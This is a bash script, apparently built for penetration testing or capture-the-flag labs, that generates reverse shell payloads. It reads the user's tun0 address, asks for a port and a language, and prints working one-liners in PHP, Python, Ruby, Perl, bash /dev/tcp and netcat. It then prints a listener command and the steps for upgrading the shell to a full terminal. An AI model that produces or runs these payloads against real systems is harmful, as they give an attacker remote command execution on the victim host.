#!/bin/bash

# install ./raspushell.sh --install
# run raspushell

H0='\033[0m'
H1='\x1b[34m'
H2='\x1b[33m'
D0='\x1b[5m'
D1='\x1b[7m'
D2='\x1b[3m'
D3='\x1b[0m'
D4='\x1b[2m'
D5='\033[0;31m' 

col2='\033[0;32m'
col1='\033[0;31m'


case "$1" in 
	#case 1
	"--install" | "-i")
		echo -e "instalando..."
		path="$(pwd)/$0"
		`/usr/bin/cp ${path} /usr/bin/raspushell`
		`chmod +x /usr/bin/raspushell`
		echo -e "${D5}Success!${H0} "
		echo -e "Run : raspushell"
		exit ;;
	#case 2
	"--help" | "-h")
		echo -e "Hey! Ja ouviu a palavra do Rasputin hoje?"
		echo -e "[!] Pra php --> ph / php ou PHP"
		echo -e "[!] Pra Python --> py / python ou Python"
		exit;;
esac



tun0="$(ip addr show | grep tun0 |grep -o 'inet [0-9]*\.[0-9]*\.[0-9]*\.[0-9]*' | grep -o '[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*')"

echo -e "${H1}${D1}[!] RA RA RASPUTIN ${H0}"
figlet -f slant "Of course I still love you"
echo -e "${H2}${D0}${D4}php :: python :: ruby :: perl :: netcat :: bash ${H0}"

read -p "[+] Select Port [default:5656]: " port

if [[ -z $port ]]; then port=5656 ; fi
if [ $port -gt 65535 ]
then
	echo -e "${D5} Selecione uma das 65,535 portas ou tu vai pra gulag!${H0}"
	exit
fi
if ! [ "$port" -eq "$port" ] 2> /dev/null
then
	echo -e "${D5} Tu tem demencia? Manda uma porta válida !!${H0}"
	exit	
fi


read -p "[+] Qual linguagem tu quer? [default:php/ph]: " lang

case "$lang" in 
	#case 1 
	"php" | "ph" | "PHP" | "" )
		echo "" 
		echo -e "[+]${col2}  php -r '$sock=fsockopen(\"$tun0\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");' ${H0}" ;; 
      
	#case 2 
	"python" | "py" | "Python")
		echo ""		
		echo -e "[+]${col2}  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$tun0",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ${H0}" ;; 
      
	#case 3 
	"ruby" | "ru" | "Ruby") 
		echo ""
		echo -e "[+]${col2}  ruby -rsocket -e'f=TCPSocket.open(\"$tun0\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' ${H0}" ;; 

	#case 3 
	"perl" | "pe" | "Perl")
		echo ""
		echo -e "[+]${col2}  perl -e 'use Socket;$i=\"$tun0\";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' ${H0}" ;; 

	#case 4
	"bash" | "ba" | "Bash")
		echo ""
		echo -e "[+]${col2}  bash -i >& /dev/tcp/$tun0/$port 0>&1 ${H0}" ;;

	#case 5
	"netcat" | "nc" | "Netcat")
		echo ""
		echo -e "[+]${col2}  nc -e /bin/bash $tun0 $port ${H0}" 
		echo -e "[+]${col2}  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $tun0 $port >/tmp/f ${H0}" ;;

	*)
		echo -e "${D5}Hay dude Invalid input, try again!!!${H0}"
		exit;;
esac 

echo "" 
echo -e "[+]${col2}  Olha teu netcat aqui:  nc -lvp $port ${H0}"
echo "" 
read -p "[+] Quer dar upgrade na shell boladona ? [y/N]: " -n 1 -r
echo 
if [[ $REPLY =~ ^[Yy]$ ]]
then
	echo -e ""
	echo -e "[!] ${col1}->${col2} python -c 'import pty; pty.spawn("/bin/bash")' ${H0}"
	echo -e "[!] ${col1}->${col2} Enter ctl+z in terminal that is running rev shell ${H0}"
	echo -e "[!] ${col1}->${col2} stty raw -echo ${H0}"
	echo -e "[!] ${col1}->${col2} fg ${H0}"
	echo -e "[!] ${col1}->${col2} export SHELL=bash ${H0}"
	echo -e "[!] ${col1}->${col2} export TERM=xterm-256color ${H0}"
	echo -e "[!] ${col1}->${col2} stty rows 38 columns 116 ${H0}"
	echo -e ""
	echo -e "[!] Welcome comrade !"
	exit
fi

echo -e "[!] RA RA RASPUTIN !"
tput sgr0
